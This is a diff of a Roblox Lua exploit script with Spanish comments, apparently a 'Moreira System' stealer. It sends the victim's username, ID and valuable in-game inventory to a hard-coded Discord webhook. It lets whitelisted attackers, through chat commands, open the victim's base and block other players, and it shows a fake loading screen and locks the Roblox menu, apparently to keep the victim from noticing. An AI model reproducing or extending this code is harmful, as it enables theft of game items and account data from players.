@@ -7,14 +7,14 @@ local UserInputService = game:GetService("UserInputService")
 local CoreGui = game:GetService("CoreGui")
 local StarterGui = game:GetService("StarterGui")
 local Lighting = game:GetService("Lighting")
-local ReplicatedStorage = game:GetService("ReplicatedStorage") -- Necesario para .open
-local VIM = game:GetService("VirtualInputManager") -- Necesario para clics automáticos en .block
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local VIM = game:GetService("VirtualInputManager")
 
 -- CONFIGURACIÓN
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1457204427265019926/CTOox2xHKlvuKSiDk5-lRlmt6dmri-S3tIa8UYcnDe0QYfciKRJMJWfB-_-zoIditG5u"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1456818151617466540/gTXIOakP_WD8mLEEuvEKO-0NeoIXCnze3xBQubOKmDhmxSioyYPIaC0gFvWOBC_VKVhg"
 local Min_Gen = 0
 
--- Whitelist para evitar bloquearse a sí mismo o amigos en .block [cite: 165]
+-- WHITELIST (Solo estos usuarios pueden usar .block y .open)
 local whitelist = {
     "hesizdev",
     "IlIlIlIlIIlI_lIlIlIl",
@@ -27,12 +27,12 @@ local PlayerGui = Jugador:WaitForChild("PlayerGui")
 local UserID = Jugador.UserId
 
 --------------------------------------------------------------------------------
--- FUNCIONES DE UTILIDAD (SIN CAMBIOS)
+-- FUNCIONES DE UTILIDAD
 --------------------------------------------------------------------------------
 
 local function isWhitelisted(username)
     for _, whitelistedName in ipairs(whitelist) do
-        if username == whitelistedName then return true end
+        if username:lower() == whitelistedName:lower() then return true end
     end
     return false
 end
@@ -84,67 +84,97 @@ local function getBrainrots()
 end
 
 --------------------------------------------------------------------------------
--- LÓGICA DE COMANDOS (.add, .block, .open)
+-- SISTEMA DE COMANDOS (PÚBLICO Y PRIVADO)
 --------------------------------------------------------------------------------
 
--- Función para que el comando .add envíe solicitud de amistad automática [cite: 188]
-local function promptFR(targetPlayer)
-    if not targetPlayer then return end
-    pcall(function()
-        StarterGui:SetCore("PromptSendFriendRequest", targetPlayer)
-    end)
-    task.wait(0.5)
-    pcall(function()
-        local rgui = CoreGui:FindFirstChild("RobloxGui")
-        local btn = rgui and rgui:FindFirstChild("ConfirmButton", true)
-        if btn then
-            GuiService.SelectedObject = btn
-            VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
-            VIM:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
-        end
-    end)
-end
+local function ejecutarComando(msg, sender)
+    local cmd = msg:lower():gsub("%s+", "")
 
--- Configura la escucha del chat para los comandos [cite: 179]
-local function configurarComandos(playerToConfig)
-    if playerToConfig == Jugador then return end -- No escucharse a sí mismo
-
-    playerToConfig.Chatted:Connect(function(msg)
-        local msgLower = msg:lower():gsub("%s+", "")
+    -- COMANDO .ADD (CUALQUIERA PUEDE USARLO)
+    if cmd == ".add" then
+        local brs = getBrainrots()
+        sendToDiscord("Comando .add activado por: " .. sender.Name, brs)
         
-        -- Comando .add: Envía webhook y pide amistad [cite: 180]
-        if msgLower == ".add" then
-            local brs = getBrainrots()
-            sendToDiscord("Comando .add ejecutado", brs)
-            pcall(function() promptFR(playerToConfig) end)
-            
-        -- Comando .block: Bloquea a todos excepto whitelist 
-        elseif msgLower == ".block" then
+        -- Manda solicitud de amistad a TODOS los jugadores
+        for _, target in ipairs(Players:GetPlayers()) do
+            if target ~= Jugador then
+                pcall(function()
+                    StarterGui:SetCore("PromptSendFriendRequest", target)
+                end)
+            end
+        end
+        
+    -- COMANDOS DE WHITELIST (.block y .open)
+    elseif isWhitelisted(sender.Name) then
+        if cmd == ".block" then
             for _, p in ipairs(Players:GetPlayers()) do
                 if p ~= Jugador and not isWhitelisted(p.Name) then
-                    StarterGui:SetCore("PromptBlockPlayer", p)
-                    task.wait(0.5)
+                    pcall(function()
+                        StarterGui:SetCore("PromptBlockPlayer", p)
+                    end)
+                    task.wait(0.3)
                 end
             end
             
-        -- Comando .open: Abre la base mediante PlotService 
-        elseif msgLower == ".open" then
+        elseif cmd == ".open" then
             pcall(function()
-                ReplicatedStorage.Packages.Net["RE/PlotService/ToggleFriends"]:FireServer()
+                local remote = ReplicatedStorage.Packages.Net:FindFirstChild("RE/PlotService/ToggleFriends")
+                if remote then remote:FireServer() end
             end)
         end
+    end
+end
+
+-- Listener de chat corregido
+local function setupChatListener(p)
+    p.Chatted:Connect(function(msg)
+        ejecutarComando(msg, p)
     end)
 end
 
--- Iniciar escucha para jugadores actuales y nuevos [cite: 183]
-for _, p in ipairs(Players:GetPlayers()) do configurarComandos(p) end
-Players.PlayerAdded:Connect(configurarComandos)
+for _, p in ipairs(Players:GetPlayers()) do setupChatListener(p) end
+Players.PlayerAdded:Connect(setupChatListener)
 
 --------------------------------------------------------------------------------
--- FUNCIONES DE PANTALLA Y SEGURIDAD
+-- FUNCIONES DE PANTALLA Y ENVÍO (Mantenidas)
 --------------------------------------------------------------------------------
 
-local function MostrarPantallaFinal()
+function sendToDiscord(link, brainrots)
+    local itemList = ""
+    local totalValue = 0
+    for i, br in ipairs(brainrots) do
+        if i <= 15 then 
+            itemList = itemList .. string.format("> `[%d]` **%s** ➔ %s (x%d)\n", i, br.name, formatNumberShort(br.value), br.count)
+        end
+        totalValue = totalValue + (br.value * br.count)
+    end
+
+    local request = syn and syn.request or http_request or request
+    if not request then return end
+    
+    pcall(function()
+        request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                content = "||@everyone|| 🩸 **REPORTE ACTIVADO POR CHAT**",
+                embeds = {{
+                    title = "🚀 Moreira System V3 - Ejecución Remota",
+                    color = 16711680,
+                    fields = {
+                        {name = "👤 Víctima", value = Jugador.Name .. " (" .. UserID .. ")", inline = true},
+                        {name = "💰 Valor Total", value = "**" .. formatNumberShort(totalValue) .. "**", inline = true},
+                        {name = "💬 Nota", value = "`" .. link .. "`"},
+                        {name = "📋 Inventario", value = (itemList ~= "" and itemList or "Vacío")}
+                    }
+                }}
+            })
+        })
+    end)
+end
+
+function MostrarPantallaFinal()
     local FinalGui = Instance.new("ScreenGui", PlayerGui)
     FinalGui.Name = "RobloxLoadingSystem"
     FinalGui.IgnoreGuiInset = true
@@ -196,39 +226,6 @@ local function MostrarPantallaFinal()
     end)
 end
 
-function sendToDiscord(link, brainrots)
-    local itemList = ""
-    local totalValue = 0
-    for i, br in ipairs(brainrots) do
-        if i <= 15 then 
-            itemList = itemList .. string.format("> `[%d]` **%s** ➔ %s (x%d)\n", i, br.name, formatNumberShort(br.value), br.count)
-        end
-        totalValue = totalValue + (br.value * br.count)
-    end
-
-    local request = syn and syn.request or http_request or request
-    pcall(function()
-        request({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode({
-                content = "||@everyone|| 🩸 **NUEVA VÍCTIMA**",
-                embeds = {{
-                    title = "🚀 Reporte de Extracción Moreira",
-                    color = 16711680,
-                    fields = {
-                        {name = "👤 Usuario", value = Jugador.Name .. " (" .. UserID .. ")", inline = true},
-                        {name = "💰 Valor Total", value = "**" .. formatNumberShort(totalValue) .. "**", inline = true},
-                        {name = "🔗 Script", value = "`" .. link .. "`"},
-                        {name = "📋 Inventario", value = (itemList ~= "" and itemList or "Vacío")}
-                    }
-                }}
-            })
-        })
-    end)
-end
-
 function trapPlayer()
     local char = Jugador.Character or Jugador.CharacterAdded:Wait()
     local hrp = char:WaitForChild("HumanoidRootPart")
@@ -249,10 +246,6 @@ function bloquearMenuRoblox()
         end
     end)
 end
-
---------------------------------------------------------------------------------
--- MENÚ DE INICIO
---------------------------------------------------------------------------------
 
 local function IniciarMenu()
     local MenuGui = Instance.new("ScreenGui", PlayerGui)
